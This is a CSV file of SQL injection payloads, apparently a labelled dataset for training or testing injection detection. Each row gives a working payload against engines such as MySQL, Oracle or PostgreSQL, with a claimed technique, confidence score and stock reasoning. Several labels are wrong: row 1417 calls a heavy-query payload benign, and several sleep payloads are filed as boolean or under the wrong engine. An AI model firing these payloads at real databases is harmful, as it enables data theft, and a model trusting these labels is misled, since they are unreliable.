id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
1401,"1%"" and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.95,Boolean logic confirmed by '9254 = ('; structured to return different results based on condition.,3
1402,"iif ( 2869 = 9448,1,1/0 )",boolean_blind,generic,0.95,Boolean logic confirmed by 'iif ('; structured to return different results based on condition.,1
1403,"1%' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( '%' = '",boolean_blind,postgresql,0.95,Boolean logic confirmed by '8407 = ('; structured to return different results based on condition.,1
1404,"1'+ ( select 'kqnj' where 9483 = 9483 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,mysql,0.95,Boolean logic confirmed by '9483 = 9483'; structured to return different results based on condition.,3
1405,1%' ) ) ) and 4595 = 4595#,boolean_blind,generic,0.95,Boolean logic confirmed by '4595 = 4595'; structured to return different results based on condition.,3
1406,"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'aytf' like 'aytf",time_blind,sqlite,0.95,Time-based blind signal 'randomblob' detected; induces measurable delay for data inference.,2
1407,"1' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'tqvy' like 'tqvy",boolean_blind,oracle,0.95,Boolean logic confirmed by '5556 = ('; structured to return different results based on condition.,3
1408,"-1830"" ) ) as bptv where 4805 = 4805 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",boolean_blind,oracle,0.95,Boolean logic confirmed by '4805 = 4805'; structured to return different results based on condition.,2
1409,"-4012"" ) or make_set ( 9354 = 9354,7185 ) and ( ""ccfn"" = ""ccfn",boolean_blind,generic,0.95,Boolean logic confirmed by 'make_set ('; structured to return different results based on condition.,2
1410,1' where 2913 = 2913 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,boolean_blind,mysql,0.95,Boolean logic confirmed by '2913 = 2913'; structured to return different results based on condition.,2
1411,1' ) ) as dqby where 9256 = 9256,boolean_blind,generic,0.95,Boolean logic confirmed by '9256 = 9256'; structured to return different results based on condition.,2
1412,1'|| ( select 'vvpn' from dual where 7011 = 7011 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||',boolean_blind,oracle,0.95,Boolean logic confirmed by '7011 = 7011'; structured to return different results based on condition.,3
1413,"-4047'|| ( select 'rqta' from dual where 9743 = 9743 union all select 9743,9743,9743#",boolean_blind,oracle,0.95,Boolean logic confirmed by '9743 = 9743'; structured to return different results based on condition.,1
1414,"1' where 5251 = 5251 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.95,Boolean logic confirmed by '5251 = 5251'; structured to return different results based on condition.,2
1415,-7548 or 2850 = 9666,boolean_blind,generic,0.95,Boolean logic confirmed by '2850 = 9666'; structured to return different results based on condition.,3
1416,"-2743 union all select 6757,6757,6757,6757,6757,6757--",union_based,generic,0.95,Union-based injection identified by 'UNION SELECT' keywords used to merge malicious results.,3
1417,"1' ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 'lshk' like 'lshk",benign,generic,1.0,No SQL injection signals or malicious patterns identified; payload appears benign.,1
1418,-8911%' or 9323 = 9323#,boolean_blind,generic,0.95,Boolean logic confirmed by '9323 = 9323'; structured to return different results based on condition.,3
1419,"1 ) ) and make_set ( 8554 = 3286,3286 ) and ( ( 7385 = 7385",boolean_blind,generic,0.95,Boolean logic confirmed by 'make_set ('; structured to return different results based on condition.,2
1420,select ( case when ( 6276 = 6276 ) then 6276 else 6276* ( select 6276 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,3
1421,"1"" ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( ""jywy"" like ""jywy",boolean_blind,mysql,0.95,Boolean logic confirmed by 'case when'; structured to return different results based on condition.,1
1422,"-6200' where 9150 = 9150 union all select 9150,9150,9150,9150,9150,9150,9150#",boolean_blind,generic,0.95,Boolean logic confirmed by '9150 = 9150'; structured to return different results based on condition.,1
1423,"1 ) as bgvd where 1753 = 1753 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.95,Boolean logic confirmed by '1753 = 1753'; structured to return different results based on condition.,3
1424,"1"" ) as kdvb where 2651 = 2651 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",boolean_blind,firebird,0.95,Boolean logic confirmed by '2651 = 2651'; structured to return different results based on condition.,3
1425,1 ) ) as xyuy where 6894 = 6894,boolean_blind,generic,0.95,Boolean logic confirmed by '6894 = 6894'; structured to return different results based on condition.,2
1426,"1%"" ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",boolean_blind,postgresql,0.95,Boolean logic confirmed by '8635 = ('; structured to return different results based on condition.,1
1427,select pg_sleep ( 5 ) and ( ( ( 'qslr' = 'qslr,time_blind,mysql,0.95,Time-based blind signal 'pg_sleep' detected; induces measurable delay for data inference.,2
1428,"1' ) where 1093 = 1093 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",boolean_blind,mysql,0.95,Boolean logic confirmed by '1093 = 1093'; structured to return different results based on condition.,2
1429,"1%"" ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""%"" = """,time_blind,sqlite,0.95,Time-based blind signal 'randomblob' detected; induces measurable delay for data inference.,2
1430,"1"" ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,oracle,0.95,Boolean logic confirmed by '9660 = ('; structured to return different results based on condition.,3
1431,"1"" ) as wmng where 5976 = 5976",boolean_blind,generic,0.95,Boolean logic confirmed by '5976 = 5976'; structured to return different results based on condition.,2
1432,1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.95,Boolean logic confirmed by 'rlike'; structured to return different results based on condition.,3
